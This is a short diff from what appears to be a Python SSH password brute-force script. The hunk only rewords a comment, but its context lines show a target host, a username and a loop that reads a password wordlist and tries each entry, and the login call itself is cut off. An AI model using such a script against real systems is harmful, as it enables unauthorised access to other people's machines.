@@ -5,7 +5,7 @@ host = "192.168.0.1"     # Change this
 username = "username"    # Change this
 attempts = 0
 
-with open("ssh-passwords-list.txt", "r") as password_list:  # Change this and put your list name
+with open("ssh-passwords-list.txt", "r") as password_list:  # Change this and set your List path
     for password in password_list:
         password = password.strip("\n")
         try:
